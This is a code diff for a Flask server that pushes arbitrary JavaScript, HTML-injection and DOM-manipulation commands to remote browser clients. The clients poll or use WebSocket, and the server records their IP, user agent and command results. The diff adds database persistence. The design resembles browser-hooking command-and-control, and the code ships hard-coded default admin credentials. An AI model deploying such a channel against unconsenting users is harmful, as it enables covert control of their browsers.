@@ -8,8 +8,59 @@ from functools import wraps
 import os
 import uuid
 import mimetypes
-from collections import deque
 from core.utils.logger import app_logger, websocket_logger, command_logger, auth_logger, log_command, log_websocket_event, log_auth_event
+from core.database import init_db, ClientRepository, CommandRepository
+from collections import deque
+
+# Initialize database
+init_db()
+
+# Global variables - these will now use the database repositories under the hood
+client_repo = ClientRepository()
+command_repo = CommandRepository()
+
+# In-memory data for faster lookups and websocket management
+clients = {}  # Client cache
+commands = {}  # Active commands
+socket_clients = {}  # WebSocket sessions
+command_logs = deque(maxlen=1000)  # Recent command history
+
+def initialize_global_state():
+    """Initialize global state from database"""
+    try:
+        # Load active clients
+        for client in client_repo.list_clients(active_only=True):
+            client_id = client['id']
+            clients[client_id] = {
+                'id': client_id,
+                'first_seen': client['first_seen'],
+                'last_seen': client['last_seen'],
+                'last_activity': client.get('last_activity'),
+                'user_agent': client.get('user_agent'),
+                'ip': client.get('ip'),
+                'connection_type': client.get('connection_type'),
+                'commands_received': client.get('commands_received', 0),
+                'successful_commands': client.get('successful_commands', 0),
+                'failed_commands': client.get('failed_commands', 0),
+                'screen_info': client.get('screen_info', {})
+            }
+
+            # Load active command for each client
+            command = command_repo.get_client_command(client_id)
+            if command:
+                commands[client_id] = command
+
+        # Load recent command logs
+        recent_logs = command_repo.get_logs(limit=1000)
+        command_logs.extend(recent_logs)
+
+        app_logger.info("Global state initialized from database")
+    except Exception as e:
+        app_logger.error(f"Error initializing global state: {e}")
+        raise
+
+# Initialize global state at startup
+initialize_global_state()
 
 # Custom error handling
 class CommandError(Exception):
@@ -94,12 +145,13 @@ ADMIN_USERNAME = os.environ.get('ADMIN_USERNAME', 'tandera')
 ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'tandera')
 ADMIN_PASSWORD_HASH = generate_password_hash(ADMIN_PASSWORD)
 
-# Armazenamento de dados em memória
-# Em produção, considere usar um banco de dados persistente
-commands = {'default': {"id": str(uuid.uuid4()), "command": "", "timestamp": datetime.now().isoformat()}}
-clients = {}  # Armazena informações sobre os clientes conectados
-command_logs = deque(maxlen=100)  # Histórico de comandos enviados, limitado a 100 entradas
-socket_clients = {}  # Mapeia client_id para session_id do Socket.IO
+# Inicializa comando padrão
+default_command = {
+    "id": str(uuid.uuid4()),
+    "command": "",
+    "timestamp": datetime.now().isoformat()
+}
+CommandRepository.create('default', 'js', '', default_command['id'])
 
 # Função auxiliar para formatar código JavaScript em um bloco try-catch
 def js_format_try_catch(js_code):
@@ -200,47 +252,7 @@ def logout():
 @app.route('/admin/set_command', methods=['POST'])
 @login_required
 def set_command():
-    """Define um comando para execução em um cliente específico.
-    
-    Processa e armazena um comando para ser executado em um cliente alvo.
-    O comando pode ser JavaScript puro, injeção de HTML ou manipulação do DOM.
-    Os comandos são entregues via WebSocket (se disponível) ou obtidos pelos
-    clientes através de polling.
-    
-    Parâmetros JSON da Requisição:
-        client_id (str): O ID do cliente alvo.
-        type (str): Tipo do comando. Um dos seguintes:
-            - 'js': Execução direta de JavaScript
-            - 'html': Injeção de conteúdo HTML
-            - 'manipulate': Manipulação de elemento DOM
-        content (str): O conteúdo a ser executado ou injetado.
-        target_id (str, opcional): Necessário para tipo 'manipulate'. ID/classe do elemento alvo.
-        action (str, opcional): Necessário para tipo 'manipulate'. A ação de manipulação.
-    
-    Returns:
-        Resposta JSON com estrutura:
-            {
-                "success": bool,
-                "command": {
-                    "id": str,
-                    "command": str,
-                    "timestamp": str,
-                    "type": str
-                }
-            }
-    
-    Raises:
-        CommandError: Para requisições inválidas, parâmetros faltando ou tipos
-                     de comando não suportados.
-    
-    Exemplo:
-        POST /admin/set_command
-        {
-            "client_id": "cliente123",
-            "type": "js",
-            "content": "alert('Olá');"
-        }
-    """
+    """Define um comando para execução em um cliente específico."""
     try:
         data = request.get_json()
         if not data:
@@ -290,14 +302,14 @@ def set_command():
                 "type": command_type
             }
             
-            # Store command for client
+            # Store command in database and update cache
+            command = command_repo.create(client_id, command_type, js_command, command_id)
             commands[client_id] = command_data
             
             # Update client info
             if client_id in clients:
                 clients[client_id]["last_command"] = current_time
-                clients[client_id]["commands_received"] = clients[client_id].get("commands_received", 0) + 1
-            
+                
             # Send via WebSocket if available
             if socketio_available and client_id in socket_clients:
                 try:
@@ -507,29 +519,24 @@ def serve_socketio_js():
     response.headers['Cache-Control'] = 'public, max-age=604800'
     return response
 
+# Route for serving static images
+@app.route('/static/img/<path:filename>')
+def serve_image(filename):
+    """Serve image files with proper caching headers"""
+    # Verify the file is an image by checking extension
+    allowed_extensions = ('jpg', 'jpeg', 'png', 'gif', 'svg', 'webp', 'bmp', 'ico')
+    if not filename.lower().endswith(allowed_extensions):
+        return jsonify({"error": "Forbidden: Not an image file"}), 403
+        
+    response = send_from_directory('static/img', filename)
+    response.headers['Cache-Control'] = 'public, max-age=31536000'  # Cache for 1 year
+    return response
+
+
 # Rota principal para o polling de comandos pelos clientes
 @app.route('/command')
 def get_command():
-    """Endpoint principal para polling de comandos pelos clientes.
-    
-    Suporta JSONP para contornar restrições de CORS quando necessário.
-    Cada cliente solicita periodicamente este endpoint para verificar se há
-    novos comandos disponíveis para execução.
-    
-    Parâmetros da Query:
-        client_id (str): ID do cliente solicitante (default: 'default')
-        last_id (str): ID do último comando recebido
-        callback (str, opcional): Nome da função callback para JSONP
-    
-    Returns:
-        Resposta JSON/JSONP contendo o comando atual para o cliente:
-        {
-            "new": bool,  # indica se é um comando novo
-            "id": str,    # ID único do comando
-            "command": str, # código JavaScript a ser executado
-            "timestamp": str # momento da criação do comando
-        }
-    """
+    """Endpoint principal para polling de comandos pelos clientes."""
     client_id = request.args.get('client_id', 'default')
     last_received = request.args.get('last_id', '')
     callback = request.args.get('callback')
@@ -539,23 +546,37 @@ def get_command():
         now = datetime.now().isoformat()
         if client_id not in clients:
             # Inicializa dados para novo cliente
-            clients[client_id] = {
+            client_data = {
+                "id": client_id,
                 "first_seen": now,
+                "last_seen": now,
+                "last_activity": now,
+                "user_agent": request.headers.get('User-Agent', ''),
+                "ip": request.remote_addr,
+                "connection_type": "polling",
                 "commands_received": 0,
+                "successful_commands": 0,
+                "failed_commands": 0,
                 "screen_info": {}
             }
+            # Salva no banco e no cache
+            client_repo.create_or_update(client_id, **client_data)
+            clients[client_id] = client_data
+
             # Inicializa comando para novo cliente
             if client_id not in commands:
                 commands[client_id] = commands.get('default', {"id": "", "command": "", "timestamp": ""})
-        
-        # Atualiza informações do cliente
-        clients[client_id].update({
-            "last_seen": now,
-            "last_activity": now,
-            "user_agent": request.headers.get('User-Agent', ''),
-            "ip": request.remote_addr
-        })
-    
+        else:
+            # Atualiza informações do cliente existente
+            client_data = {
+                "last_seen": now,
+                "last_activity": now,
+                "user_agent": request.headers.get('User-Agent', ''),
+                "ip": request.remote_addr
+            }
+            client_repo.create_or_update(client_id, **client_data)
+            clients[client_id].update(client_data)
+
     # Obtém o comando atual para este cliente
     current_command = commands.get(client_id, commands.get('default', {"id": "", "command": "", "timestamp": ""}))
     
@@ -611,25 +632,7 @@ if socketio_available:
 
     @socketio.on('register')
     def handle_register(data):
-        """Registra um cliente conectado via WebSocket.
-        
-        Associa o ID do cliente com a sessão WebSocket atual e inicializa
-        ou atualiza as informações do cliente. Também envia quaisquer comandos
-        pendentes para clientes recém-registrados.
-        
-        Args:
-            data (dict): Dados de registro contendo:
-                client_id (str): Identificador único para o cliente
-        
-        Eventos Emitidos:
-            - 'client_update': Para sala admin quando um novo cliente conecta
-            - 'command': Para o cliente se houver comandos pendentes
-            - 'register_error': Para o cliente se o registro falhar
-        
-        Nota:
-            Isto é necessário após a conexão inicial para que o cliente
-            comece a receber comandos e atualizações.
-        """
+        """Registra um cliente conectado via WebSocket."""
         try:
             client_id = data.get('client_id')
             if not client_id:
@@ -644,27 +647,44 @@ if socketio_available:
             # Initialize or update client data
             now = datetime.now().isoformat()
             if client_id not in clients:
-                clients[client_id] = {
+                client_data = {
+                    "id": client_id,
                     "first_seen": now,
+                    "last_seen": now,
+                    "last_activity": now,
+                    "user_agent": request.headers.get('User-Agent', ''),
+                    "ip": request.remote_addr,
+                    "connection_type": "websocket",
                     "commands_received": 0,
+                    "successful_commands": 0,
+                    "failed_commands": 0,
                     "screen_info": {}
                 }
+                # Salva no banco e no cache
+                client_repo.create_or_update(client_id, **client_data)
+                clients[client_id] = client_data
+
                 if client_id not in commands:
                     commands[client_id] = commands.get('default', {
                         "id": "",
                         "command": "",
                         "timestamp": ""
                     })
+            else:
+                # Atualiza informações do cliente existente
+                client_data = {
+                    "last_seen": now,
+                    "last_activity": now,
+                    "user_agent": request.headers.get('User-Agent', ''),
+                    "ip": request.remote_addr,
+                    "connection_type": "websocket"
+                }
+                client_repo.create_or_update(client_id, **client_data)
+                clients[client_id].update(client_data)
             
-            # Update client information
-            clients[client_id].update({
-                "last_seen": now,
-                "last_activity": now,
-                "user_agent": request.headers.get('User-Agent', ''),
-                "ip": request.remote_addr,
-                "connection_type": "websocket"
-            })
-            
+            # Salva informações da sessão WebSocket
+            client_repo.update_socket_session(client_id, session_id)
+
             # Notify admin about new client
             try:
                 socketio.emit('client_update', {
@@ -709,12 +729,16 @@ if socketio_available:
             if client_id:
                 log_websocket_event('disconnect', client_id)
                 
-                # Remove socket mapping but keep client records
+                # Remove socket mapping
                 del socket_clients[client_id]
                 
-                # Update client status
+                # Update client status in memory and database
                 if client_id in clients:
                     clients[client_id]["connection_type"] = "disconnected"
+                    client_repo.create_or_update(client_id, connection_type="disconnected")
+                
+                # Remove socket session from database
+                client_repo.remove_socket_session(client_id)
                 
                 # Notify admin
                 try:
@@ -750,25 +774,7 @@ if socketio_available:
 
 @app.route('/command/result', methods=['POST'])
 def receive_command_result():
-    """Endpoint para receber resultados da execução de comandos dos clientes.
-    
-    Recebe e processa os resultados da execução de comandos, atualizando logs
-    e estatísticas. Notifica administradores sobre os resultados via WebSocket
-    quando disponível.
-    
-    JSON da Requisição:
-        client_id (str): ID do cliente que executou o comando
-        command_id (str): ID do comando executado
-        success (bool): Indica se o comando foi executado com sucesso
-        result (str): Resultado ou mensagem de erro da execução
-        execution_time (float): Tempo de execução em milissegundos
-    
-    Returns:
-        Resposta JSON indicando sucesso do processamento
-    
-    Raises:
-        CommandError: Para requisições inválidas ou parâmetros faltando
-    """
+    """Endpoint para receber resultados da execução de comandos dos clientes."""
     try:
         data = request.get_json()
         if not data:
@@ -784,7 +790,10 @@ def receive_command_result():
         if not client_id or not command_id:
             raise CommandError("Missing required parameters: client_id and command_id")
         
-        # Create result entry
+        # Create result entry and save to database
+        command_repo.add_result(command_id, client_id, success, result, execution_time)
+        
+        # Create result entry for memory cache
         result_entry = {
             "client_id": client_id,
             "command_id": command_id,
@@ -794,7 +803,7 @@ def receive_command_result():
             "execution_time": execution_time
         }
         
-        # Update command logs
+        # Update command logs in memory
         updated = False
         for log in command_logs:
             if log["id"] == command_id:
@@ -809,7 +818,7 @@ def receive_command_result():
         if not updated:
             app_logger.warning(f"Received result for unknown command: {command_id}")
         
-        # Update client information
+        # Update client information in cache
         if client_id in clients:
             clients[client_id]["last_activity"] = timestamp
             clients[client_id]["last_result"] = {
@@ -817,12 +826,9 @@ def receive_command_result():
                 "success": success,
                 "timestamp": timestamp
             }
-            
-            # Update success/failure counters
-            if success:
-                clients[client_id]["successful_commands"] = clients[client_id].get("successful_commands", 0) + 1
-            else:
-                clients[client_id]["failed_commands"] = clients[client_id].get("failed_commands", 0) + 1
+        
+        # Update client activity in database
+        client_repo.update_activity(client_id)
         
         # Log command result
         if success:
